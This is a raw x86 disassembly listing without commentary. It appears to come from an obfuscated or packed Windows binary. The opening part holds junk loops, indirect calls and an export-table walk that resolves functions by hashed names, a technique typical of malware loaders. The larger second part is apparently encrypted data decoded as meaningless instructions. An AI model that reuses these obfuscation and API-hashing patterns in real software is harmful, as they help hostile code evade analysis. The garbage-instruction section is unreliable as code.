  40539d:	mov    DWORD PTR [ebp-0x30],ecx
  4053a0:	dec    esi
  4053a1:	mov    esi,DWORD PTR [ebp-0x4]
  4053a4:	and    DWORD PTR ds:0x42d01c,0x0
  4053ae:	jmp    0x4053c2
  4053b3:	xor    ecx,ecx
  4053b5:	or     ecx,DWORD PTR ds:0x42d01c
  4053bb:	inc    ecx
  4053bc:	mov    DWORD PTR ds:0x42d01c,ecx
  4053c2:	cmp    DWORD PTR ds:0x42d01c,0x1e
  4053c9:	jae    0x405407
  4053cf:	cmp    DWORD PTR ds:0x42d01c,0xe
  4053d6:	jne    0x4053e2
  4053dc:	call   DWORD PTR ds:0x42ed51
  4053e2:	cmp    DWORD PTR ds:0x42d01c,0xd
  4053e9:	jne    0x4053fc
  4053ef:	mov    ecx,DWORD PTR ds:0x42d01c
  4053f5:	inc    ecx
  4053f6:	mov    DWORD PTR ds:0x42d01c,ecx
  4053fc:	jmp    0x4053b3
  405401:	or     ecx,DWORD PTR ds:0x42a000
  405407:	xor    esi,ebx
  405409:	dec    ecx
  40540a:	add    esi,eax
  40540c:	mov    ecx,DWORD PTR [ebp-0x24]
  40540f:	and    DWORD PTR ds:0x429000,0x42c018
  405419:	sub    ecx,eax
  40541b:	or     DWORD PTR ds:0x42b014,0x429024
  405425:	lea    edx,[esi-0x3272dd]
  40542b:	add    DWORD PTR ds:0x42d008,0x42a004
  405435:	xor    ecx,ebx
  405437:	adc    DWORD PTR ds:0x42d018,0x3588
  405441:	xor    edx,ebx
  405443:	cmp    edx,ecx
  405445:	je     0x4056db
  40544b:	mov    ecx,DWORD PTR [ebp-0x4]
  40544e:	or     DWORD PTR ds:0x42a004,0x7d41
  405458:	xor    ecx,ebx
  40545a:	sbb    DWORD PTR ds:0x42c004,0x1a4b
  405464:	add    ecx,eax
  405466:	cmp    esi,ecx
  405468:	mov    DWORD PTR ds:0x429018,0x444d
  405472:	jne    0x4056b8
  405478:	and    DWORD PTR ds:0x42b004,0x273e
  405482:	push   DWORD PTR [ebp+0x8]
  405485:	add    DWORD PTR ds:0x42d01c,0x42c004
  40548f:	call   0x404fa3
  405494:	mov    DWORD PTR [ebp-0x18],eax
  405497:	sub    ecx,ecx
  405499:	mov    eax,DWORD PTR [ebp-0x4]
  40549c:	and    DWORD PTR ds:0x42d010,0x0
  4054a6:	jmp    0x4054b8
  4054ab:	mov    edi,DWORD PTR ds:0x42d010
  4054b1:	inc    edi
  4054b2:	mov    DWORD PTR ds:0x42d010,edi
  4054b8:	cmp    DWORD PTR ds:0x42d010,0x1b
  4054bf:	jae    0x40557c
  4054c5:	cmp    DWORD PTR ds:0x42d010,0x10
  4054cc:	jne    0x4054d8
  4054d2:	call   DWORD PTR ds:0x42ed55
  4054d8:	cmp    DWORD PTR ds:0x42d010,0xf
  4054df:	jne    0x4054f2
  4054e5:	mov    edi,DWORD PTR ds:0x42d010
  4054eb:	inc    edi
  4054ec:	mov    DWORD PTR ds:0x42d010,edi
  4054f2:	jmp    0x4054ab
  4054f7:	mov    DWORD PTR ds:0x42c00c,0x1c
  405501:	cmp    DWORD PTR ds:0x42c00c,0x0
  405508:	je     0x40557c
  40550e:	cmp    DWORD PTR ds:0x42c00c,0x4
  405515:	jne    0x405544
  40551b:	push   0x213d
  405520:	push   0x2583
  405525:	push   0x42d000
  40552a:	push   0x5f61
  40552f:	push   0x589a
  405534:	push   0x1da2
  405539:	push   0x4b46
  40553e:	call   DWORD PTR ds:0x42ed59
  405544:	cmp    DWORD PTR ds:0x42c00c,0x5
  40554b:	jne    0x40555e
  405551:	mov    edi,DWORD PTR ds:0x42c00c
  405557:	dec    edi
  405558:	mov    DWORD PTR ds:0x42c00c,edi
  40555e:	xor    edi,edi
  405560:	add    edi,DWORD PTR ds:0x42c00c
  405566:	dec    edi
  405567:	mov    DWORD PTR ds:0x42c00c,edi
  40556d:	jmp    0x405501
  405572:	adc    DWORD PTR ds:0x42c004,0x62a8
  40557c:	mov    ecx,DWORD PTR [ebp-0x18]
  40557f:	dec    edi
  405580:	xor    eax,ebx
  405582:	sub    edi,0x56bd
  405588:	mov    edi,0x3272dd
  40558d:	mov    DWORD PTR ds:0x42d00c,0x2303
  405597:	add    eax,edi
  405599:	mov    DWORD PTR ds:0x42a00c,0x3ae7
  4055a3:	cmp    ecx,eax
  4055a5:	mov    DWORD PTR ds:0x42d018,0x39c7
  4055af:	je     0x407aa3
  4055b5:	add    DWORD PTR ds:0x42b004,0x7234
  4055bf:	push   DWORD PTR [ebp-0x18]
  4055c2:	push   DWORD PTR [ebp+0x8]
  4055c5:	call   0x40cc1e
  4055ca:	mov    ecx,DWORD PTR ds:0x42b01c
  4055d0:	sub    DWORD PTR ds:0x42a010,ecx
  4055d6:	mov    DWORD PTR [ebp-0x18],eax
  4055d9:	mov    eax,DWORD PTR [ebp-0x4]
  4055dc:	mov    ecx,DWORD PTR [ebp-0x18]
  4055df:	mov    DWORD PTR ds:0x429000,0x7fe2
  4055e9:	xor    eax,ebx
  4055eb:	or     DWORD PTR ds:0x42a01c,0x42c010
  4055f5:	add    eax,edi
  4055f7:	mov    DWORD PTR ds:0x42b010,0x7af8
  405601:	cmp    ecx,eax
  405603:	mov    DWORD PTR ds:0x429014,0x1a63
  40560d:	je     0x407aa3
  405613:	mov    eax,ds:0x411f6c
  405618:	mov    ecx,DWORD PTR ds:0x411f84
  40561e:	sub    eax,ecx
  405620:	sub    eax,DWORD PTR [eax+ecx*1]
  405623:	mov    eax,DWORD PTR [ebp-0x18]
  405626:	mov    eax,DWORD PTR [eax+0x18]
  405629:	mov    DWORD PTR [ebp-0x24],eax
  40562c:	and    DWORD PTR ds:0x429028,edi
  405632:	mov    eax,DWORD PTR [ebp-0x18]
  405635:	and    DWORD PTR ds:0x429014,0x0
  40563f:	xor    ecx,ecx
  405641:	xor    ecx,DWORD PTR ds:0x429014
  405647:	inc    ecx
  405648:	mov    DWORD PTR ds:0x429014,ecx
  40564e:	cmp    DWORD PTR ds:0x429014,0xa
  405655:	jne    0x405669
  40565b:	push   DWORD PTR [ebp-0xc]
  40565e:	push   0x42e0a1
  405663:	call   DWORD PTR ds:0x42ed5d
  405669:	cmp    DWORD PTR ds:0x429014,0x9
  405670:	jne    0x405683
  405676:	mov    ecx,DWORD PTR ds:0x429014
  40567c:	inc    ecx
  40567d:	mov    DWORD PTR ds:0x429014,ecx
  405683:	cmp    DWORD PTR ds:0x429014,0x1c
  40568a:	jb     0x40563f
  405690:	mov    ecx,DWORD PTR [ebp+0x8]
  405693:	add    ecx,DWORD PTR [eax+0x20]
  405696:	mov    DWORD PTR [ebp-0x2c],ecx
  405699:	mov    eax,DWORD PTR [ebp-0x18]
  40569c:	mov    ecx,DWORD PTR [ebp+0x8]
  40569f:	add    ecx,DWORD PTR [eax+0x24]
  4056a2:	mov    DWORD PTR [ebp-0x34],ecx
  4056a5:	mov    eax,DWORD PTR [ebp-0x18]
  4056a8:	mov    ecx,DWORD PTR [ebp+0x8]
  4056ab:	add    ecx,DWORD PTR [eax+0x1c]
  4056ae:	mov    eax,edi
  4056b0:	mov    DWORD PTR [ebp-0x18],ecx
  4056b3:	jmp    0x407a6b
  4056b8:	mov    ecx,DWORD PTR [ebp-0x2c]
  4056bb:	mov    edx,DWORD PTR [ebp+0x8]
  4056be:	add    edx,DWORD PTR [ecx+esi*4]
  4056c1:	mov    DWORD PTR [ebp-0x28],edx
  4056c4:	mov    ecx,DWORD PTR [ebp-0x4]
  4056c7:	mov    edx,DWORD PTR [ebp-0x28]
  4056ca:	xor    ecx,ebx
  4056cc:	add    ecx,eax
  4056ce:	cmp    edx,ecx
  4056d0:	je     0x407a6b
  4056d6:	jmp    0x407a57
  4056db:	mov    ecx,DWORD PTR [ebp-0x4]
  4056de:	mov    edx,DWORD PTR [ebp-0x8]
  4056e1:	xor    ecx,ebx
  4056e3:	add    ecx,eax
  4056e5:	cmp    edx,ecx
  4056e7:	je     0x407aaf
  4056ed:	jmp    0x407a45
  4056f2:	or     al,0xd7
  4056f4:	xchg   ebp,eax
  4056f5:	loop   0x40576c
  4056f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4056f8:	emms   
  4056fa:	adc    dl,BYTE PTR ds:0xb4fef58a
  405700:	inc    esp
  405701:	stc    
  405702:	xlat   BYTE PTR ds:[ebx]
  405703:	pop    edi
  405704:	jp     0x405780
  405706:	aaa    
  405707:	pop    edi
  405708:	jp     0x405784
  40570a:	mov    ds:0x9200b9a8,al
  40570f:	mov    ebx,0xfe17ed69
  405714:	in     al,0xf5
  405716:	add    al,0xd0
  405718:	jne    0x405744
  40571a:	pop    edx
  40571b:	mov    ebx,0x2155ffdb
  405720:	test   eax,0x4548a597
  405725:	pop    eax
  405726:	xor    al,0xc3
  405728:	or     eax,0x6fd7590a
  40572d:	xchg   esi,eax
  40572e:	xor    bl,BYTE PTR [ecx]
  405730:	jmp    0xc7dae13
  405735:	test   eax,0x6809da72
  40573a:	mov    al,0x25
  40573c:	sub    eax,0xa953cbbb
  405741:	int    0x1e
  405743:	(bad)  
  405744:	pop    esp
  405745:	and    eax,0xf86b6530
  40574a:	outs   dx,DWORD PTR ds:[esi]
  40574b:	sbb    eax,0x7d6c4b9d
  405750:	add    BYTE PTR [ebx-0x35],0x41
  405754:	ins    DWORD PTR es:[edi],dx
  405755:	jne    0x40575f
  405757:	iret   
  405758:	(bad)  
  405759:	clc    
  40575a:	mov    DWORD PTR [eax],ebp
  40575c:	ss out 0x38,eax
  40575f:	fisubr WORD PTR [eax+0xa]
  405762:	fdivr  DWORD PTR [eax+ebp*4]
  405765:	pop    edi
  405766:	bnd js 0x40579e
  405769:	sub    eax,0xc2f91070
  40576e:	inc    eax
  40576f:	xchg   esp,eax
  405770:	pop    eax
  405771:	test   DWORD PTR [esp+ecx*2],0x459a664
  405778:	scas   eax,DWORD PTR es:[edi]
  405779:	xchg   edi,eax
  40577a:	push   edi
  40577b:	jmp    0xf55a2c31
  405780:	stos   DWORD PTR es:[edi],eax
  405781:	sub    DWORD PTR [edi+0x6e3c6cb0],ebp
  405787:	xor    al,ah
  405789:	add    BYTE PTR [edi],ch
  40578b:	fstp   QWORD PTR [ebp+0xca0e5e8]
  405791:	push   0xffffffb7
  405793:	and    eax,0xec6fa8b9
  405798:	popa   
  405799:	and    eax,0x10559e5d
  40579e:	mov    al,BYTE PTR [ebp+0x2]
  4057a1:	push   es
  4057a2:	adc    al,0xbf
  4057a4:	(bad)  
  4057a5:	addr16 jg 0x405767
  4057a8:	dec    edi
  4057a9:	jle    0x405757
  4057ab:	shl    BYTE PTR [esi+esi*4],cl
  4057ae:	icebp  
  4057af:	push   ebp
  4057b0:	adc    BYTE PTR [esi+0x6e],al
  4057b3:	pop    esi
  4057b4:	rol    BYTE PTR [ecx],cl
  4057b6:	and    ch,BYTE PTR [esi+0x43]
  4057b9:	call   0xead0137e
  4057be:	mov    eax,ds:0x40eabe01
  4057c3:	sub    BYTE PTR [edi],0x5
  4057c6:	sbb    BYTE PTR [eax],dh
  4057c8:	out    0xcd,eax
  4057ca:	sar    DWORD PTR [edx],1
  4057cc:	sbb    BYTE PTR [edi+ebx*1-0x2f],bh
  4057d0:	or     BYTE PTR [ebx],cl
  4057d2:	pop    es
  4057d3:	sub    BYTE PTR [ebx-0x1e30771],ch
  4057d9:	int    0x56
  4057db:	pushf  
  4057dc:	pop    esi
  4057dd:	xchg   DWORD PTR [ecx+0x25a84d87],ebp
  4057e3:	add    ah,BYTE PTR [esi-0x5a]
  4057e6:	cmp    DWORD PTR [ecx-0x39],edx
  4057e9:	fsub   DWORD PTR [ecx+0x6c]
  4057ec:	jno    0x40578d
  4057ee:	(bad)  
  4057f0:	mov    eax,0xfcf9ecf
  4057f5:	add    eax,0x3d368488
  4057fa:	enter  0x1ac5,0xb5
  4057fe:	mov    ecx,ebp
  405800:	mov    ebx,0x8ad0961d
  405805:	inc    ebx
  405806:	mov    eax,0xe161b1a5
  40580b:	xor    BYTE PTR [edi+0x17],bh
  40580e:	pusha  
  40580f:	inc    esi
  405810:	mov    al,ds:0xba4b6ad9
  405815:	xor    BYTE PTR [esi],bh
  405817:	jmp    0x405876
  405819:	fld    QWORD PTR [ebx+0x3c]
  40581c:	cmp    BYTE PTR [eax+0x7a5842ef],cl
  405822:	fs dec edi
  405824:	jo     0x4057ef
  405826:	prefetchw BYTE PTR [ebx+0x28afea97]
  40582d:	int3   
  40582e:	jb     0x40581f
  405830:	inc    eax
  405831:	fld    TBYTE PTR [ebp+eiz*1+0x39]
  405835:	iret   
  405836:	loop   0x405836
  405838:	push   ss
  405839:	jecxz  0x405802
  40583b:	ds or  al,0x63
  40583e:	dec    edx
  40583f:	sahf   
  405840:	cli    
  405841:	xchg   esp,eax
  405842:	(bad)  
  405843:	outs   dx,DWORD PTR ds:[esi]
  405844:	ss std 
  405846:	fidiv  DWORD PTR [ebx]
  405848:	mov    bl,dh
  40584a:	xchg   eax,ecx
  40584c:	or     esi,edi
  40584e:	in     al,dx
  40584f:	retf   0xd726
  405852:	mov    DWORD PTR [edi+ebx*4-0x71],esp
  405856:	and    eax,DWORD PTR [ebx]
  405858:	out    dx,eax
  405859:	pop    edx
  40585a:	and    al,0xf0
  40585c:	(bad)  
  40585d:	mov    esi,0xc0580f33
  405862:	fcos   
  405864:	pop    esi
  405865:	mov    BYTE PTR [edi],cl
  405867:	(bad)  
  405869:	inc    ebp
  40586a:	(bad)  
  40586c:	push   ebx
  40586d:	bound  ecx,QWORD PTR [edi]
  40586f:	pop    edx
  405870:	rcl    BYTE PTR [ecx-0x9],1
  405873:	jecxz  0x4058ab
  405875:	cs mov eax,0xecbcb289
  40587b:	imul   eax,DWORD PTR [ebp+0x6b29f492],0xd92cc1bf
  405885:	repnz nop
  405887:	je     0x4058db
  405889:	imul   ebx,DWORD PTR [edi-0x57123901],0xffffffd4
  405890:	sub    al,0x79
  405892:	shld   DWORD PTR [ebp+0x5a],eax,cl
  405896:	or     DWORD PTR [ebx],ebp
  405898:	(bad)  [eax+eiz*1]
  40589b:	sbb    al,BYTE PTR [ecx+0x46]
  40589e:	popf   
  40589f:	and    al,0xc4
  4058a1:	ja     0x405877
  4058a3:	jl     0x405850
  4058a5:	stc    
  4058a6:	call   0x844a:0xe2af26f2
  4058ad:	inc    esp
  4058ae:	(bad)  
  4058af:	rcr    ah,1
  4058b1:	aam    0x3d
  4058b3:	xor    ah,0x54
  4058b6:	sbb    eax,0xfd68ed13
  4058bb:	lds    eax,FWORD PTR [edx]
  4058bd:	gs jbe 0x405925
  4058c0:	push   ds
  4058c1:	(bad)  
  4058c2:	loop   0x405901
  4058c4:	test   eax,ecx
  4058c6:	adc    DWORD PTR [eax],esp
  4058c8:	sub    BYTE PTR [eax+0x6a],cl
  4058cb:	jle    0x4058a4
  4058cd:	mov    esp,0xe08de4b8
  4058d2:	fdivr  DWORD PTR [ecx-0x14]
  4058d5:	cmp    esi,edx
  4058d7:	mov    BYTE PTR [edi],bh
  4058d9:	les    edx,FWORD PTR [edx-0x56]
  4058dc:	inc    esp
  4058dd:	(bad)  
  4058de:	mul    dl
  4058e0:	sub    al,0x82
  4058e2:	imul   ch
  4058e4:	lea    eax,[eax]
  4058e6:	mov    esp,0xc935e1b1
  4058eb:	dec    edx
  4058ec:	call   0xfbd:0x774a7a5d
  4058f3:	push   cs
  4058f4:	adc    DWORD PTR [ecx-0x43],ebx
  4058f7:	cmp    BYTE PTR [edi-0x59],0x54
  4058fb:	cld    
  4058fc:	daa    
  4058fd:	pop    esi
  4058fe:	xchg   ebx,eax
  4058ff:	fs aam 0xd
  405902:	pusha  
  405903:	das    
  405904:	jge    0x405951
  405906:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405907:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405908:	adc    DWORD PTR [ebx+ecx*4+0x39],esp
  40590c:	out    dx,eax
  40590d:	repz pop esi
  40590f:	sbb    edx,DWORD PTR [esi]
  405911:	test   al,0x91
  405913:	inc    ecx
  405914:	cmp    ebx,esp
  405916:	mov    ebx,0xeb3d21d
  40591b:	lahf   
  40591c:	(bad)  
  40591e:	pop    ecx
  40591f:	ins    DWORD PTR es:[edi],dx
  405920:	or     cl,BYTE PTR [esi+0xef73556]
  405926:	pop    eax
  405927:	add    ecx,ecx
  405929:	sar    DWORD PTR [edx],1
  40592b:	fdiv   DWORD PTR [ecx]
  40592d:	jb     0x4059a5
  40592f:	test   al,0xa5
  405931:	sti    
  405932:	retf   
  405933:	into   
  405934:	and    edx,DWORD PTR [ecx-0x61]
  405937:	inc    edx
  405938:	mov    WORD PTR [ecx-0x40],ds
  40593b:	gs xchg ecx,eax
  40593d:	jne    0x4058d0
  40593f:	push   eax
  405940:	lahf   
  405941:	das    
  405942:	fdiv   QWORD PTR [ebx+0xb]
  405945:	jecxz  0x405977
  405947:	jecxz  0x4058de
  405949:	adc    edx,esp
  40594b:	adc    eax,0x46acc0fd
  405950:	pop    ecx
  405951:	add    BYTE PTR ds:[esi-0x3b4d2bd8],cl
  405958:	stos   BYTE PTR es:[edi],al
  405959:	mov    al,0xc8
  40595b:	lea    edx,[edi-0x22]
  40595e:	pushf  
  40595f:	and    eax,0xb6f4481f
  405964:	loope  0x405961
  405966:	sub    bh,BYTE PTR [ebp+0x1c]
  405969:	or     dh,dh
  40596b:	iret   
  40596c:	push   0xfffffffe
  40596e:	inc    ebp
  40596f:	jp     0x40597a
  405971:	sub    al,0x26
  405973:	xchg   edx,eax
  405974:	cmp    al,0xb4
  405976:	call   0x14df:0x5c494d55
  40597d:	mov    esi,DWORD PTR [ecx+0x54e5148d]
  405983:	jecxz  0x40594f
  405985:	ins    DWORD PTR es:[edi],dx
  405986:	jmp    DWORD PTR [edi]
  405988:	add    BYTE PTR [esi+0x45],al
  40598b:	mov    al,dl
  40598d:	test   eax,0xa91a6816
  405992:	mov    ecx,0xfea24b4a
  405997:	jp     0x4059d6
  405999:	aaa    
  40599a:	xchg   edx,eax
  40599b:	mov    al,ds:0x5d335dc4
  4059a0:	inc    ebx
  4059a1:	xchg   BYTE PTR [esi],bl
  4059a3:	fcom   QWORD PTR [edx]
  4059a5:	or     eax,0xa3267668
  4059aa:	cmp    ch,bl
  4059ac:	push   esp
  4059ad:	lods   al,BYTE PTR ds:[esi]
  4059ae:	inc    ebx
  4059af:	sar    BYTE PTR [edx],0xf9
  4059b2:	add    ebp,edi
  4059b4:	mov    ch,cl
  4059b6:	jle    0x4059f7
  4059b8:	outs   dx,BYTE PTR ds:[esi]
  4059b9:	retf   0x50e8
  4059bc:	mov    bl,0x53
  4059be:	mov    DWORD PTR [esi+0x66],edi
  4059c1:	(bad)  
  4059c2:	fnstcw WORD PTR [ebx-0xb]
  4059c5:	xchg   edx,eax
  4059c6:	add    DWORD PTR [ecx-0x5dc3d368],0x146dd810
  4059d0:	cmp    al,0xe2
  4059d2:	mov    WORD PTR [ebp+0x33],?
  4059d5:	sar    BYTE PTR [edi+0x6d034d78],0xd0
  4059dc:	pop    ebx
  4059dd:	loop   0x405995
  4059df:	adc    BYTE PTR [edi+0x3],bl
  4059e2:	and    ebx,DWORD PTR ds:0x9632cb9c
  4059e8:	popa   
  4059e9:	sbb    ecx,edx
  4059eb:	mov    al,ds:0xe04169ff
  4059f0:	pop    esp
  4059f1:	push   es
  4059f2:	pop    ds
  4059f3:	push   cs
  4059f4:	xor    ecx,edx
  4059f6:	jmp    0xb72f:0xfedf14e7
  4059fd:	bound  esi,QWORD PTR [eax+0x5e852bd7]
  405a03:	shrd   edi,ecx,cl
  405a06:	jp     0x405a14
  405a08:	dec    eax
  405a09:	stos   DWORD PTR es:[edi],eax
  405a0a:	xchg   ebp,eax
  405a0b:	out    dx,eax
  405a0c:	push   0xc255428b
  405a11:	inc    eax
  405a12:	sub    DWORD PTR ds:0xba716f1d,eax
  405a18:	fcomp  QWORD PTR [eax]
  405a1a:	ret    0x7561
  405a1d:	std    
  405a1e:	ds dec edi
  405a20:	cmp    ecx,ecx
  405a22:	pusha  
  405a23:	sub    BYTE PTR [ebx+0x5d],0xe6
  405a27:	mov    ch,0x9e
  405a29:	lods   al,BYTE PTR ds:[esi]
  405a2a:	mov    cl,0xb4
  405a2c:	cmp    dl,dl
  405a2e:	pop    ds
  405a2f:	sbb    ebx,DWORD PTR [edi]
  405a31:	mov    edi,0x8a5e8cdc
  405a36:	ins    DWORD PTR es:[edi],dx
  405a37:	xor    ch,BYTE PTR [ecx]
  405a39:	mov    ebx,0x57db85c5
  405a3e:	add    eax,0xfab4aa5c
  405a43:	int3   
  405a44:	jo     0x405a2c
  405a46:	mov    cl,BYTE PTR [esi-0x42]
  405a49:	dec    ebx
  405a4a:	jne    0x405a4d
  405a4c:	sub    bl,BYTE PTR [edi]
  405a4e:	lahf   
  405a4f:	mov    esp,0xbcaab0ec
  405a54:	stc    
  405a55:	sbb    ch,BYTE PTR [ebx+0x7789eac0]
  405a5b:	xor    eax,DWORD PTR [edx]
  405a5d:	pop    esp
  405a5e:	in     eax,dx
  405a5f:	xchg   ecx,eax
  405a60:	out    0x3b,al
  405a62:	aam    0xb8
  405a64:	mov    ds:0xa39fd15b,al
  405a69:	out    0xad,eax
  405a6b:	aaa    
  405a6c:	xor    al,0x76
  405a6e:	ror    DWORD PTR [esi],1
  405a70:	ins    BYTE PTR es:[edi],dx
  405a71:	(bad)  
  405a72:	cs dec eax
  405a74:	or     bh,BYTE PTR [esi]
  405a76:	cmp    BYTE PTR [esi],ch
  405a78:	mov    ebp,DWORD PTR [edx+0x79d2ea84]
  405a7e:	jp     0x405a0c
  405a80:	push   ebx
  405a81:	mov    ds:0x4d66052b,al
  405a86:	ret    
  405a87:	cmp    ebx,edi
  405a89:	xor    ch,dh
  405a8b:	rcr    DWORD PTR [ebp-0x7876c544],cl
  405a91:	push   0xffffffdb
  405a93:	lahf   
  405a94:	(bad)  
  405a95:	jmp    0x437a:0xa132b445
  405a9c:	pop    edi
  405a9d:	pusha  
  405a9e:	repz arpl WORD PTR [ecx+0xc],si
  405aa2:	mov    ecx,0xc0ead81
  405aa7:	adc    al,0x5f
  405aa9:	push   ecx
  405aaa:	mov    al,ds:0xd3163abc
  405aaf:	dec    edi
  405ab0:	in     al,0x32
  405ab2:	or     eax,0xd5eb2c28
  405ab7:	cld    
  405ab8:	std    
  405ab9:	daa    
  405aba:	scas   eax,DWORD PTR es:[edi]
  405abb:	mov    edx,0x852d38a1
  405ac0:	adc    edx,DWORD PTR [edx-0x1e2c47cb]
  405ac6:	leave  
  405ac7:	shl    DWORD PTR [ecx+0x24],cl
  405aca:	inc    eax
  405acb:	mov    ds:0x3b30e0e9,al
  405ad0:	ins    DWORD PTR es:[edi],dx
  405ad1:	call   0xe76a:0x342a6a64
  405ad8:	mov    dh,0x75
  405ada:	das    
  405adb:	dec    esp
  405adc:	or     eax,DWORD PTR [ecx-0x34f85c83]
  405ae2:	fild   QWORD PTR [edi]
  405ae4:	out    dx,eax
  405ae5:	or     BYTE PTR [edx],bh
  405ae7:	call   0x9f4b:0xdbc385fa
  405aee:	hlt    
  405aef:	jno    0x405a95
  405af1:	sbb    DWORD PTR [esi-0x77312001],eax
  405af7:	ficomp WORD PTR [edx+0x38a946e0]
  405afd:	mov    bl,0x8c
  405aff:	(bad)  
  405b00:	std    
  405b01:	std    
  405b02:	mov    bh,0x44
  405b04:	and    ebp,DWORD PTR [ebx]
  405b06:	ror    DWORD PTR [edi+0xd],cl
  405b09:	and    ah,BYTE PTR [eax+0x11]
  405b0c:	xor    BYTE PTR [eax-0xc],al
  405b0f:	ss or  al,0x7f
  405b12:	jge    0x405b78
  405b14:	into   
  405b15:	mov    ah,0xad
  405b17:	cmp    BYTE PTR [edx],0x6b
  405b1a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405b1b:	inc    edi
  405b1c:	adc    eax,0x9cfc85cf
  405b21:	adc    ebp,DWORD PTR [esi+0x56]
  405b24:	mov    edx,0xa3472cbc
  405b29:	rcl    BYTE PTR [ebp-0x1c],0xd5
  405b2d:	rol    BYTE PTR ds:0xbaa5f940,0x31
  405b34:	push   esp
  405b35:	dec    ebp
  405b36:	scas   eax,DWORD PTR es:[edi]
  405b37:	cdq    
  405b38:	in     al,dx
  405b39:	mov    eax,0x49748a41
  405b3e:	jg     0x7721119c
  405b44:	(bad)  
  405b45:	and    eax,0x5fa9a6f6
  405b4a:	sti    
  405b4b:	inc    eax
  405b4c:	xor    eax,0x39e706ce
  405b51:	lods   al,BYTE PTR ds:[esi]
  405b52:	adc    eax,0x93e19d3d
  405b57:	push   ebx
  405b58:	pop    esp
  405b59:	mov    bl,0xf5
  405b5b:	mov    al,0xfb
  405b5d:	lea    esp,[edx+0x34f2d4d2]
  405b63:	cmp    al,0x8f
  405b65:	shr    BYTE PTR [ecx+0x7d0c4a61],0x43
  405b6c:	cmp    al,0x3d
  405b6e:	push   edi
  405b6f:	scas   eax,DWORD PTR es:[edi]
  405b70:	repz mov eax,ds:0xd504ac00
  405b76:	pop    esp
  405b77:	fldcw  WORD PTR [edx]
  405b79:	mov    eax,0x44b084d8
  405b7e:	jo     0x405b29
  405b80:	jae    0x405bd0
  405b82:	pop    ss
  405b83:	xor    al,0x96
  405b85:	push   ds
  405b86:	sar    BYTE PTR [edx-0x6991a524],1
  405b8c:	adc    bh,bl
  405b8e:	je     0x405b3c
  405b90:	(bad)  
  405b91:	sub    eax,ebx
  405b93:	std    
  405b94:	pop    ds
  405b95:	fsubr  st,st(7)
  405b97:	adc    al,BYTE PTR [esi-0x7e]
  405b9a:	enter  0xf734,0x19
  405b9e:	and    eax,0xd8402b8f
  405ba3:	adc    al,0xde
  405ba5:	jb     0x405bea
  405ba7:	mov    ch,0x7a
  405ba9:	mov    cl,0x55
  405bab:	arpl   bx,bp
  405bad:	cmp    BYTE PTR [edx-0x21],bl
  405bb0:	lods   al,BYTE PTR ds:[esi]
  405bb1:	nop    DWORD PTR [ecx]
  405bb4:	push   edx
  405bb5:	imul   eax,DWORD PTR [ecx-0x5ff34275],0x3b086f15
  405bbf:	push   ebp
  405bc0:	call   0xb098:0x3421f1f2
  405bc7:	xor    edi,0x28
  405bca:	and    eax,0xbec3cbf1
  405bcf:	rcl    edx,cl
  405bd1:	dec    ebx
  405bd2:	cmp    BYTE PTR ds:0x50f3f74b,ch
  405bd8:	jle    0x405c0f
  405bda:	sar    DWORD PTR [eax],0x8a
  405bdd:	out    0xc7,eax
  405bdf:	mov    ebp,0x2d5f12a0
  405be4:	mov    dl,0xf6
  405be6:	test   DWORD PTR [edi+eax*4+0x6b5fef40],edx
  405bed:	ja     0x405ba4
  405bef:	je     0x405c6b
  405bf1:	pusha  
  405bf2:	outs   dx,DWORD PTR ds:[esi]
  405bf3:	stc    
  405bf4:	stos   BYTE PTR es:[edi],al
  405bf5:	or     BYTE PTR [ebx+0x73d237f1],bl
  405bfb:	inc    ecx
  405bfc:	xor    ebx,DWORD PTR [esi]
  405bfe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405bff:	xchg   ebx,eax
  405c00:	aam    0xd2
  405c02:	std    
  405c03:	test   al,0x9a
  405c05:	jp     0x405c14
  405c07:	leave  
  405c08:	xor    eax,0x883acf8b
  405c0d:	inc    edi
  405c0e:	mov    BYTE PTR [edx-0x2d1c03fb],al
  405c14:	in     al,dx
  405c15:	xor    edi,DWORD PTR [eax]
  405c17:	sub    eax,0xc6767d1c
  405c1c:	cmp    ecx,esp
  405c1e:	mov    edx,0xaaaa740e
  405c23:	cdq    
  405c24:	lahf   
  405c25:	cmp    al,BYTE PTR [eax+esi*1+0x59ff17d]
  405c2c:	(bad)  
  405c2d:	aas    
  405c2e:	mov    esi,0x76d42d1c
  405c33:	and    DWORD PTR [ecx-0x3c],ebx
  405c36:	add    al,0x52
  405c38:	push   ds
  405c39:	jmp    0x8188:0x437755c
  405c40:	imul   esi,ecx,0xffffffb1
  405c43:	cmp    edi,DWORD PTR [ebp+0x38]
  405c46:	mov    eax,0xa9eb8a3a
  405c4b:	mov    edx,0xb83987e7
  405c50:	mov    esp,esi
  405c52:	inc    eax
  405c53:	stc    
  405c54:	jmp    0x8b00537d
  405c59:	pop    edi
  405c5a:	push   ss
  405c5b:	mov    dh,0xb8
  405c5d:	test   DWORD PTR [ecx-0x43],ebp
  405c60:	ds aam 0xa1
  405c63:	nop
  405c64:	jns    0x405c3e
  405c66:	(bad)  
  405c68:	in     al,0x63
  405c6a:	push   ebp
  405c6b:	push   cs
  405c6c:	push   ecx
  405c6d:	mov    al,0x76
  405c6f:	(bad)  
  405c70:	mov    ebp,0xccac57e
  405c75:	add    dh,BYTE PTR [edi-0x44b3bb33]
  405c7b:	inc    edx
  405c7c:	lock sbb dh,BYTE PTR [ecx+edi*1]
  405c80:	test   DWORD PTR [esp+eax*4],esp
  405c83:	pop    edi
  405c84:	jmp    0xc9622159
  405c89:	xor    DWORD PTR [ebx+0x20b72064],0xe90c4314
  405c93:	fidiv  WORD PTR [edi-0x1313c187]
  405c99:	data16 sub bl,BYTE PTR [ebp+0x1a]
  405c9d:	sbb    dh,al
  405c9f:	icebp  
  405ca0:	xor    BYTE PTR [ebp+0x76],ch
  405ca3:	mov    cl,0x70
  405ca5:	ins    DWORD PTR es:[edi],dx
  405ca6:	mov    eax,0xf28b149d
  405cab:	sbb    DWORD PTR [eax],0x28
  405cae:	or     DWORD PTR [edi],esp
  405cb0:	test   eax,0x9da31295
  405cb5:	loopne 0x405ce7
  405cb7:	push   es
  405cb8:	jg     0x405cd5
  405cba:	inc    edx
  405cbb:	push   es
  405cbc:	scas   eax,DWORD PTR es:[di]
  405cbe:	add    eax,0x9e3adf4
